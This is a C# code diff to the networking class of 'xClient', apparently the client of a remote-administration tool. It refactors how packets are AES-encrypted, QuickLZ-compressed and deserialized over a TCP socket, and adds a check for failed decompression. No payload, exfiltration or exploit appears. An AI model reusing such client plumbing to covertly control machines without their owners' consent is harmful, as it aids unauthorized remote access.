@@ -3,11 +3,9 @@ using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Net.Sockets;
-using System.Text;
 using System.Threading;
 using ProtoBuf;
 using ProtoBuf.Meta;
-using xClient.Config;
 using xClient.Core.Compression;
 using xClient.Core.Encryption;
 using xClient.Core.Extensions;
@@ -274,7 +272,6 @@ namespace xClient.Core.Networking
 
                 _handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 _handle.SetKeepAliveEx(KEEP_ALIVE_INTERVAL, KEEP_ALIVE_TIME);
-                _handle.NoDelay = true;
 
                 _readBuffer = new byte[BUFFER_SIZE];
                 _tempHeader = new byte[HEADER_SIZE];
@@ -454,20 +451,26 @@ namespace xClient.Core.Networking
                                 if (_writeOffset == _payloadLen)
                                 {
                                     if (encryptionEnabled)
-                                        _payloadBuffer = AES.Decrypt(_payloadBuffer, Encoding.UTF8.GetBytes(Settings.PASSWORD));
+                                        _payloadBuffer = AES.Decrypt(_payloadBuffer);
 
                                     if (_payloadBuffer.Length > 0)
                                     {
                                         if (compressionEnabled)
-                                            _payloadBuffer = new SafeQuickLZ().Decompress(_payloadBuffer, 0, _payloadBuffer.Length);
+                                            _payloadBuffer = SafeQuickLZ.Decompress(_payloadBuffer);
 
-                                        using (MemoryStream deserialized = new MemoryStream(_payloadBuffer))
+                                        if (_payloadBuffer.Length > 0)
                                         {
-                                            IPacket packet =
-                                                Serializer.DeserializeWithLengthPrefix<IPacket>(deserialized, PrefixStyle.Fixed32);
+                                            using (MemoryStream deserialized = new MemoryStream(_payloadBuffer))
+                                            {
+                                                IPacket packet =
+                                                    Serializer.DeserializeWithLengthPrefix<IPacket>(deserialized,
+                                                        PrefixStyle.Fixed32);
 
-                                            OnClientRead(packet);
+                                                OnClientRead(packet);
+                                            }
                                         }
+                                        else // payload compression failed
+                                            process = false;
                                     }
                                     else // payload decryption failed
                                         process = false;
@@ -571,10 +574,10 @@ namespace xClient.Core.Networking
                 }
 
                 if (compressionEnabled)
-                    payload = new SafeQuickLZ().Compress(payload, 0, payload.Length, 3);
+                    payload = SafeQuickLZ.Compress(payload);
 
                 if (encryptionEnabled)
-                    payload = AES.Encrypt(payload, Encoding.UTF8.GetBytes(Settings.PASSWORD));
+                    payload = AES.Encrypt(payload);
 
                 byte[] header = new byte[]
                 {
